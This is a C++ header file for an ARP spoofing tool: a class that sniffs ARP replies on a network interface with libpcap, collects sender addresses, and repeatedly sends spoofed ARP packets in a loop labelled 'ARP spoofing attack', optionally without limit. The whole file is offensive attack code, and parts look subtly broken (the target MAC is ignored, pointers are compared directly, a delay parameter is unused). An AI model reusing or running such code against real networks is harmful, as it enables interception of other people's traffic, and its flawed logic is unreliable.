#pragma once

#include <optional>
#include <netinet/in.h>
#include "arp/SendARPManager.cpp"

class ARPAttackAgent {
private:
    char* netInterface;
    uint8_t* senderIP;

    bool isBroadcast = false;
    uint8_t* singleClient;
    SendARPManager sendArpManager;

    std::optional<ARPHeader*> processARPPacket(const uint8_t *packet) {
        auto *etherHeader = (EtherHeader *) packet;
        if (ntohs(etherHeader->type) == ETHER_TYPE_ARP) {
            auto *arpHeader = (ARPHeader *) (packet + sizeof(EtherHeader));
            if (arpHeader->op_code == ARP_OPCODE_REPLY) {
                if (this->isBroadcast or this->singleClient == arpHeader->sender_ip) {
                    return arpHeader;
                } else {
                    return {};
                }
            }
        }
        return {};
    }
public:
    const static int UNLIMITED = 0;

    ARPAttackAgent(char* netInterface, uint8_t* senderIP, std::optional<uint8_t*> targetMAC):
    netInterface(netInterface), senderIP(senderIP) {
        if (!targetMAC) isBroadcast = true;
        else this->singleClient = senderIP;

        this->sendArpManager = SendARPManager();
    }

    void scanClients() {
        std::cout << "INFO: Start scanning sender clients..." << std::endl;
        char errBuf[PCAP_ERRBUF_SIZE];

        pcap_t* handle = pcap_open_live(netInterface, BUFSIZ, 1, 1000, errBuf);
        auto go = true;
        while (go) {
            struct pcap_pkthdr* header;
            const u_char* packet;
            pcap_next_ex(handle, &header, &packet);

            auto arpHeader = this->processARPPacket(packet);

            if (!arpHeader) {
                return;
            } else this->sendArpManager.addARPTarget(arpHeader.value());

            std::cout << "Collected ARP sender: " << arpHeader.value()->sender_ip << std::endl;
            go = false;
        }

        std::cout << "INFO: Success scanning sender clients" << std::endl;
    }

    void sendARPAttack(uint maxAttack, uint delay=1) {
        std::cout << "INFO: Start ARP spoofing attack...." << std::endl;

        bool go = true;
        uint attackCount = 0;
        while (go) {
            std::cout << "[" << attackCount << "]" << " Send attack..." << std::endl;
            this->sendArpManager.sendARPPacket();
            attackCount++;
            if (attackCount > maxAttack and maxAttack != 0) go = false;
        }

        std::cout << "INFO: End ARP spoofing attack" << std::endl;
    }
};
